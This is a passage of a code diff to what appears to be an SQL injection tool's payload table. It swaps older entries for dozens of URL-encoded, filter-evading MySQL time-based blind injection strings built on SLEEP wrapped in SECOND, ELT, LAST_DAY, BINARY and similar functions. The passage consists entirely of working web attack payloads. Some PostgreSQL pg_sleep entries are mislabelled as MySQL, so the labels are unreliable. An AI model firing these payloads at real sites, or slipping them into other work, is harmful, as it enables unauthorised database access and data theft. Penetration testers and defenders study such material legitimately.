+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "(SECOND(ELT(1453=1453,SLEEP(time(10)))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "(SECOND(IF(1=1,SLEEP(time(10)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "(SECOND(IF(1=1,SLEEP(time(10)),0)))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
                 "dbms": "MySQL",
             },
         ],
@@ -438,87 +1107,4378 @@ PAYLOADS = {
             },
         ],
         "time-based": [
-            {
-                "payload": "(SELECT(0)FROM(SELECT(SLEEP([10])))a)",
+                        {
+                "payload": "%20OR%20(SECOND(IF(1=1,SLEEP(SECOND(10)),0)))--",
                 "comments": [
-                    #{"pref": "'XOR", "suf": "XOR'Z"},
+                    {"pref": "", "suf": ""},
                 ],
                 "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
                 "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
                 "dbms": "MySQL",
             },
             {
-                "payload": "IF(now()=sysdate(),SLEEP(10),0)",
+                "payload": "%20%26%20(SECOND(ELT(1453=1453,SLEEP(MOD(21,%2011)))))",
                 "comments": [
-                    {"pref": "'XOR(", "suf": ")XOR'Z"},
-                    {"pref": '"XOR(', "suf": ')XOR"Z'},
                     {"pref": "", "suf": ""},
-                    {"pref": "", "suf": "-- wXyW"},
-                    {"pref": "'AND(", "suf": ")AND'Z"},
-                    {"pref": "'OR(", "suf": ")OR'Z"},
-                    {"pref": '"OR(', "suf": ')OR"Z'},
-                    {"pref": " AND ", "suf": "-- wXyW"},
-                    {"pref": "' AND ", "suf": "-- wXyW"},
-                    {"pref": '" AND ', "suf": "-- wXyW"},
-                    {"pref": ") AND ", "suf": "-- wXyW"},
-                    {"pref": "') AND ", "suf": "-- wXyW"},
-                    {"pref": '") AND ', "suf": "-- wXyW"},
-                    # {"pref": ") OR ", "suf": "OR(1=1-- wXyW"},
-                    # {"pref": "') OR ", "suf": "OR('1'='1 wXyW"},
-                    # {"pref": '") OR ', "suf": 'OR("1"="1-- wXyW'},
                 ],
-                "title": "MySQL >= 5.0.12 time-based blind (IF - comment)",
-                "vector": "IF([INFERENCE],SLEEP([SLEEPTIME]),0)",
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
                 "dbms": "MySQL",
             },
             {
-                "payload": "(SELECT CASE WHEN(1234=1234) THEN SLEEP([SLEEPTIME]) ELSE 0 END)",
+                "payload": "%20%26%20(SECOND(ELT(1453=1453,SLEEP(MOD(21,%2011)))))--",
                 "comments": [
-                    {"pref": "'XOR", "suf": "XOR'Z"},
-                    {"pref": '"XOR', "suf": 'XOR"Z'},
                     {"pref": "", "suf": ""},
-                    {"pref": "'OR", "suf": "OR'Z"},
-                    {"pref": "'AND", "suf": "AND'Z"},
-                    {"pref": "'+", "suf": "+'"},
-                    {"pref": "", "suf": "-- wXyW"},
-                    {"pref": '"AND', "suf": 'AND"Z'},
-                    {"pref": " AND ", "suf": "-- wXyW"},
-                    {"pref": "' AND ", "suf": "-- wXyW"},
-                    {"pref": '" AND ', "suf": "-- wXyW"},
-                    {"pref": ") AND ", "suf": "-- wXyW"},
-                    {"pref": "') AND ", "suf": "-- wXyW"},
-                    {"pref": '") AND ', "suf": "-- wXyW"},
-                    # {"pref": ")", "suf": "-- wXyW"},
-                    # {"pref": "')", "suf": "-- wXyW"},
-                    # {"pref": '")', "suf": "-- wXyW"},
-                    # {"pref": ")", "suf": "XOR(1=1-- wXyW"},
-                    # {"pref": "')", "suf": "XOR('1'='1 wXyW"},
-                    # {"pref": '")', "suf": 'XOR("1"="1-- wXyW'},
                 ],
-                "title": "MySQL >= 5.0.12 time-based blind (CASE STATEMENT)",
-                "vector": "(SELECT CASE WHEN([INFERENCE]) THEN SLEEP([SLEEPTIME]) ELSE 0 END)",
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
                 "dbms": "MySQL",
             },
             {
-                "payload": "SLEEP([SLEEPTIME])",
+                "payload": "%20%26%20(SECOND(ELT(1453=1453,SLEEP(REPEAT(10,%201)))))--",
                 "comments": [
-                    {"pref": " AND ", "suf": ""},
-                    # {"pref": " OR ", "suf": ""},
-                    {"pref": " AND ", "suf": "-- wXyW"},
-                    # {"pref": " OR ", "suf": "-- wXyW"},
-                    {"pref": "' AND ", "suf": "-- wXyW"},
-                    # {"pref": "' OR ", "suf": "-- wXyW"},
-                    {"pref": '" AND ', "suf": "-- wXyW"},
-                    # {"pref": '" OR ', "suf": "-- wXyW"},
-                    {"pref": ") AND ", "suf": "-- wXyW"},
-                    # {"pref": ") OR ", "suf": "-- wXyW"},
-                    {"pref": "') AND ", "suf": "-- wXyW"},
-                    # {"pref": "') OR ", "suf": "-- wXyW"},
-                    {"pref": '") AND ', "suf": "-- wXyW"},
-                    # {"pref": '") OR ', "suf": "-- wXyW"},
+                    {"pref": "", "suf": ""},
                 ],
-                "title": "MySQL >= 5.0.12 time-based blind (SLEEP)",
-                "vector": "0986=IF(([INFERENCE]),SLEEP([SLEEPTIME]),986)",
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20%26%20(SECOND(ELT(1453=1453,SLEEP(REPLACE(\"19\",%20\"9\",%20\"0\")))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20%26%20(SECOND(ELT(1453=1453,SLEEP(REPLACE(\"19\",%20\"9\",%20\"0\")))))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20%26%20(SECOND(ELT(1453=1453,SLEEP(SECOND(10)))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20%26%20(SECOND(ELT(1453=1453,SLEEP(SECOND(10)))))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20%26%20(SECOND(ELT(1453=1453,SLEEP(time(10)))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20%26%20(SECOND(ELT(1453=1453,SLEEP(time(10)))))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20%26%20(SECOND(IF(1=1,SLEEP(REPEAT(10,%201)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20%26%20(SECOND(IF(1=1,SLEEP(REPLACE(\"19\",%20\"9\",%20\"0\")),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20%26%20(SECOND(IF(1=1,SLEEP(time(10)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20%26%20SECOND(ELT(1453=1453,SLEEP(REPEAT(10,%201))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20%26%20SECOND(IF(1=1,SLEEP(SECOND(10)),0))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20%26%20sleep(time(10))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20%26%20sleep(time(10))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20%26(LAST_DAY(IF(1=1,SLEEP(time(10)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20%26(LAST_DAY(IF(1=1,SLEEP(time(10)),0)))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20%26(pg_sleep(dexp(10)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20%26(pg_sleep(dexp(10)))--%20",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20%26(SECOND(ELT(1453=1453,SLEEP(MOD(21,%2011)))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20%26(SECOND(ELT(1453=1453,SLEEP(MOD(21,%2011)))))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20%26(SECOND(ELT(1453=1453,SLEEP(REPEAT(10,%201)))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20%26(SECOND(ELT(1453=1453,SLEEP(REPEAT(10,%201)))))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20%26(SECOND(ELT(1453=1453,SLEEP(REPLACE(\"19\",%20\"9\",%20\"0\")))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20%26(SECOND(ELT(1453=1453,SLEEP(REPLACE(\"19\",%20\"9\",%20\"0\")))))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20%26(SECOND(ELT(1453=1453,SLEEP(SECOND(10)))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20%26(SECOND(ELT(1453=1453,SLEEP(SECOND(10)))))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20%26(SECOND(ELT(1453=1453,SLEEP(time(10)))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20%26(SECOND(ELT(1453=1453,SLEEP(time(10)))))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20%26(SECOND(IF(1=1,SLEEP(time(10)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20%26(SECOND(IF(1=1,SLEEP(time(10)),0)))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20(BINARY(SELECT(sleep(MOD(21,%2011)))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20(BINARY(SELECT(sleep(REPEAT(10,%201)))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20(BINARY(SELECT(sleep(REPLACE(\"19\",%20\"9\",%20\"0\")))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20(BINARY(SELECT(sleep(TIME(10)))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20(BINARY(SELECT(sleep(TIME(10)))))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20(LAST_DAY(IF(1=1,SLEEP(REPEAT(10,%201)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20(LAST_DAY(IF(1=1,SLEEP(REPEAT(10,%201)),0)))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20(LAST_DAY(IF(1=1,SLEEP(REPLACE(\"19\",%20\"9\",%20\"0\")),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20(LAST_DAY(IF(1=1,SLEEP(REPLACE(\"19\",%20\"9\",%20\"0\")),0)))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20(LAST_DAY(IF(1=1,SLEEP(SECOND(10)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20(LAST_DAY(IF(1=1,SLEEP(SECOND(10)),0)))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20(LAST_DAY(IF(1=1,SLEEP(time(10)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20(LAST_DAY(IF(1=1,SLEEP(time(10)),0)))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20(last_day(if(now()=sysdate(),sleep(REPLACE(\"19\",%20\"9\",%20\"0\")),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20(last_day(if(now()=sysdate(),sleep(REPLACE(\"19\",%20\"9\",%20\"0\")),0)))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20(last_day(if(now()=sysdate(),sleep(SECOND(10)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20(last_day(if(now()=sysdate(),sleep(SECOND(10)),0)))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20(last_day(if(now()=sysdate(),sleep(time(10)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20(last_day(if(now()=sysdate(),sleep(time(10)),0)))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20(SECOND(-IF(1=1,SLEEP(SECOND(10)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20(SECOND(ELT(1453=1453,SLEEP(MOD(21,%2011)))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20(SECOND(ELT(1453=1453,SLEEP(MOD(21,%2011)))))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20(SECOND(ELT(1453=1453,SLEEP(REPEAT(10,%201)))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20(SECOND(ELT(1453=1453,SLEEP(REPEAT(10,%201)))))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20(SECOND(ELT(1453=1453,SLEEP(REPLACE(\"19\",%20\"9\",%20\"0\")))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20(SECOND(ELT(1453=1453,SLEEP(REPLACE(\"19\",%20\"9\",%20\"0\")))))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20(SECOND(ELT(1453=1453,SLEEP(SECOND(10)))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20(SECOND(ELT(1453=1453,SLEEP(SECOND(10)))))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20(SECOND(ELT(1453=1453,SLEEP(time(10)))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20(SECOND(ELT(1453=1453,SLEEP(time(10)))))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20(SECOND(IF(1=1,SLEEP(REPEAT(10,%201)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20(SECOND(IF(1=1,SLEEP(REPEAT(10,%201)),0)))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%20(SECOND(IF(1=1,SLEEP(REPLACE(\"19\",%20\"9\",%20\"0\")),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
